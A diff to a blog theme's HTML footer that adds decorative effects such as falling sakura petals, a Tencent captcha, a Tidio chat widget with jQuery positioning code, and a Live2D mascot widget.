     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1324,10 +1574,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1338,6 +1617,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
